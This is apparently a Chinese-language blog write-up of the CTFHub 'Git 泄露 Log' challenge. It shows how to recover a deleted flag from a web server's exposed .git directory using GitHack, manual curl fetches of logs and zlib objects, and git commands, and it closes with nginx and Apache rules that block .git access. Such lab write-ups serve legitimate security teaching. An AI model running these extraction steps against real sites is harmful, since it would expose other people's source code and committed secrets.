---
layout: post
title: CTFHub - Git 泄露 Log Writeup
platform: ctfhub
date: 2026-10-15 14:16:00 +0800
categories: CTF
---

CTFHub - Git 泄露 Log Writeup

一、题目信息

- 平台：CTFHub（技能树 → Web → 信息泄露 → Git 泄露 → **Log**）
- 题型：Web
- 考点：**`.git` 目录泄露**、Git 对象模型、从提交历史恢复被删除的文件
- 题目提示原文：

```text
当前大量开发人员使用 git 进行版本控制，对站点自动部署。
如果配置不当，可能会将 .git 文件夹直接部署到线上环境。
这就引起了 git 泄露漏洞。
请尝试使用 BugScanTeam 的 GitHack 完成本题
```


```text
泄露的路径     : /.git/HEAD、/.git/config、/.git/logs/HEAD、/.git/index  （全部 200）

从 /.git/logs/HEAD 读到三次提交：
    0000...0000  c03e61d42d58b58368afeeaa6dd62ac56701114b  commit (initial): init
    c03e61d4...  c3669bd7e7b7928caa008ac19560aa69a60f907b  commit: add flag      ← ★
    c3669bd7...  5446b5494738b421eacff56a797d88d54b9920ac  commit: remove flag

对比两次提交的 tree：
    init / remove flag 的 tree (012ae1fc):  50x.html、index.html
    add flag 的 tree        (fa81df8d):  50x.html、62992601912895.txt、index.html
                                              ↑ ★ 多出来的就是这个文件

取出它的 blob 对象（110e089b338a...）解压：
    ctfhub{0c77aeb0f7240f43490c5e05}

flag          : ctfhub{0c77aeb0f7240f43490c5e05}
```

二、题目分析

**① 题目现象**

打开环境首页，只有一句话：

```html
<h1>Where is flag?</h1>
```

页面上什么都没有 —— 但**访问 `/.git/` 就有东西**。

**② 什么是 Git 泄露**

```text
Git 是版本控制工具，它在项目目录里建一个 .git 文件夹，
里面存放【全部版本历史 + 所有文件的所有版本】。

正常情况：.git 只存在于开发者的电脑上，不该上传到服务器
出问题的情况：运维用 git 部署时，把 .git 一起传上去了
             （或者用 git clone 到 web 目录，没删 .git）

危害：攻击者能拿到【整个代码仓库】—— 不只是当前版本，
      而是【所有历史提交】，包括那些"删掉"的敏感内容。
```

**③ 为什么 `.git` 泄露这么致命**

```text
因为 Git 的对象模型是【内容寻址 + 不可变】的：

    · 每个文件内容 → 算一个 SHA-1 → 存成一个 blob 对象
    · 每次提交 → 记录"当时的目录树长什么样"（tree 对象）
    · ★ 对象一旦写入就【不会删除】，即使你 commit 删掉文件，
      那个文件对象仍然躺在 .git/objects/ 里

所以"删掉敏感文件"这个动作，在 Git 里等于：
    新提交的目录树里不再列出它
    ——但它的内容还在仓库里，谁都能翻出来
```

**④ 破题思路**

```text
① 确认 /.git/ 可访问
② 读 /.git/logs/HEAD —— 这是【操作日志】，记录了每次提交的说明文字！
      本题直接在这里看到："init" → "add flag" → "remove flag"
      ★ 名字叫 "Log" 的题，答案通常就在这个文件里
③ 拿到三个提交的 SHA
④ 对比"add flag"和当前版本的目录树，找出多出来的文件
⑤ 下载那个文件的 blob 对象 → 解压 → flag 到手
```

三、解题步骤

**方法一：用 GitHack 工具（题目推荐的）**

```bash
git clone https://github.com/BugScanTeam/GitHack.git
cd GitHack
python2 GitHack.py http://challenge-xxx:10800/.git/
```

它会在当前目录生成一个文件夹，里面是**恢复出来的完整源码 + .git 仓库**。
然后：

```bash
cd challenge-xxx_10800/
git log                          # 看提交历史
git diff HEAD~1                  # 看上一次提交改了什么
git show <commit-sha>            # 看某次提交的完整内容
```

> ⚠️ GitHack 是 **Python 2** 写的。如果只有 Python 3，可以：
> - 找 py3 的 fork
> - 或者**手工下载对象**（就是下面方法二）

**方法二：手工从 `.git` 里挖（不需要装工具）**

**第 1 步：确认 `.git` 可访问**

```powershell
curl.exe -s -o NUL -w "%{http_code}`n" "http://challenge-xxx:10800/.git/HEAD"
# 200 就是泄露了
```

**第 2 步：读操作日志（★ 本题的关键）**

```powershell
curl.exe -s "http://challenge-xxx:10800/.git/logs/HEAD"
```

输出：

```text
0000000000000000000000000000000000000000 c03e61d42d58b58368afeeaa6dd62ac56701114b CTFHub <sandbox@ctfhub.com> 1792044861 +0000	commit (initial): init
c03e61d42d58b58368afeeaa6dd62ac56701114b c3669bd7e7b7928caa008ac19560aa69a60f907b CTFHub <sandbox@ctfhub.com> 1792044861 +0000	commit: add flag
c3669bd7e7b7928caa008ac19560aa69a60f907b 5446b5494738b421eacff56a797d88d54b9920ac CTFHub <sandbox@ctfhub.com> 1792044861 +0000	commit: remove flag
```

**每一行的格式**：

```text
<旧版本SHA> <新版本SHA> <提交者> <时间戳>	commit: <提交说明>
                                          └──────┬──────┘
                                        ★ 这里直接写着做了什么！
```

**第 3 步：取提交对象，看它指向的目录树**

```text
# 取对象（git 对象的存放路径是有规律的：前2位是目录名，后38位是文件名）
http://目标/.git/objects/c3/669bd7e7b7928caa008ac19560aa69a60f907b

# 拿到的是 zlib 压缩的数据，解压后长这样：
commit 211
tree fa81df8d5d3d2b4f0a6e8073f601b4fb4b5de3e1     ← ★ 这次提交的目录树
parent c03e61d42d58b58368afeeaa6dd62ac56701114b
author CTFHub <sandbox@ctfhub.com> 1792044861 +0000
committer CTFHub <sandbox@ctfhub.com> 1792044861 +0000

add flag
```

**第 4 步：对比两次提交的目录树**

```text
# 取 "add flag" 的 tree
http://目标/.git/objects/fa/81df8d5d3d2b4f0a6e8073f601b4fb4b5de3e1
# 取 "remove flag"（也就是当前版本）的 tree
http://目标/.git/objects/01/2ae1fc6b838a345b689ae6bb4ec0edfd517a64

# tree 对象解压后是"目录清单"，格式为：
#   <模式> <文件名>\0<20字节的SHA>
```

对比结果：

```text
init / remove flag 的 tree:   50x.html、index.html
add flag 的 tree:             50x.html、62992601912895.txt、index.html
                                            ↑ ★ 就是这个
```

**第 5 步：取出那个文件的内容**

```text
http://目标/.git/objects/11/0e089b338a458517632fcc912abb56f7453278
→ zlib 解压 → 
blob 33
ctfhub{0c77aeb0f7240f43490c5e05}
```

**方法三：用 git 命令恢复整个仓库（有 Git 就行）**

```bash
# 把 .git 目录整个下载到本地一个空文件夹里
mkdir repo && cd repo
# （用 wget -r 或爬虫把 /.git/ 全下下来，保持目录结构）

git log --all --oneline
git show c3669bd7e7b7928caa008ac19560aa69a60f907b
git diff c03e61d4 5446b549        # 对比"init"和"remove flag"两次提交
```

四、延伸知识

**① Git 泄露的三种子题（CTFHub 就是这么分的）**

| 子题 | 敏感内容在哪 | 怎么看 |
|---|---|---|
| **Log** | **提交说明 / 历史提交里的文件** | `git log`、`git show`（本题） |
| **Stash** | 被 `git stash` 暂存的改动 | `git stash list` → `git stash pop` |
| **Index** | 暂存区（`git add` 过但没 commit） | 看 `.git/index` 或恢复后 `git diff --cached` |

**② Git 对象模型速查（理解了这个，手工挖也不怕）**

```text
.git/
├── HEAD              当前在哪个分支（ref: refs/heads/master）
├── config            仓库配置
├── index             暂存区（二进制，记录哪些文件被 add 了）
├── logs/
│   └── HEAD          ★ 操作日志（每次提交/切换分支都记一笔，含提交说明）
├── refs/
│   └── heads/master  分支指向哪个提交（一个 SHA）
├── packed-refs       打包的引用（对象多了会被打包）
└── objects/          ★ 所有对象（blob / tree / commit）
    ├── 01/2ae1fc...      松散对象（前2位做目录名）
    ├── pack/*.pack       打包对象（对象多了会打包，此时要 git unpack-objects）
    └── info/

对象类型：
    blob    → 文件内容
    tree    → 目录清单（列出里面的文件和子目录）
    commit  → 一次提交（指向一个 tree + 父提交 + 说明文字）

★ 每个对象的路径 = .git/objects/ + SHA前2位 + / + SHA后38位
  内容是 zlib 压缩的，解压后开头是 "<类型> <长度>\0"
```

**③ 实战中最常用的几条命令**

```bash
git log --all --oneline           # 所有提交（一行一个）
git log -p                        # 带 diff 的提交历史
git show <sha>                    # 看某次提交的完整内容
git diff <sha1> <sha2>            # 对比两次提交
git stash list / git stash pop    # 恢复被 stash 的改动
git fsck --lost-found             # ★ 找出"悬空对象"（被删掉但还在仓库里的东西）
git cat-file -p <sha>             # 直接看任意对象的内容
```

> 💡 `git fsck --lost-found` 是挖"被删内容"的利器 ——
> 它会列出所有**没有任何引用指向的对象**（dangling blob/commit），
> 那些往往就是被删除的敏感文件。

**④ 防护**

```text
· 部署时不要把 .git 传到 web 目录：
      git clone 后删除 .git，或用 git archive 导出干净副本
      rsync 时排除：--exclude='.git'
· 服务器直接拒绝访问：
      Nginx:  location ~ /\.git { deny all; }
      Apache: <DirectoryMatch "/\.git"> Require all denied </DirectoryMatch>
      （建议把 .svn / .hg / .DS_Store / .env 一起禁掉）
· ★ 最重要的一条：密钥一旦提交过 Git，即使删掉也必须【立刻作废重发】
      —— 因为历史里永远留着，攻击者随时能翻出来
```

五、总结

- **本题核心：服务器暴露了 `.git` 目录 → 从提交历史里恢复出被"删除"的 flag 文件。**
- 最快的突破口是 **`/.git/logs/HEAD`** —— 它是操作日志，**直接写着每次提交干了什么**
  （本题的提交说明就是 `init` → `add flag` → `remove flag`，等于把答案的方向告诉你了）。
- 记住这条最重要的认知：

```text
★ "删掉" ≠ "消失"
  在 Git 里，文件被删除只是"新的目录树不再列出它"，
  文件对象本身仍然完整地保存在 .git/objects/ 里。

  所以：提交过敏感信息的仓库，一旦 .git 泄露，
        所有历史版本（包括删掉的）都能被恢复出来
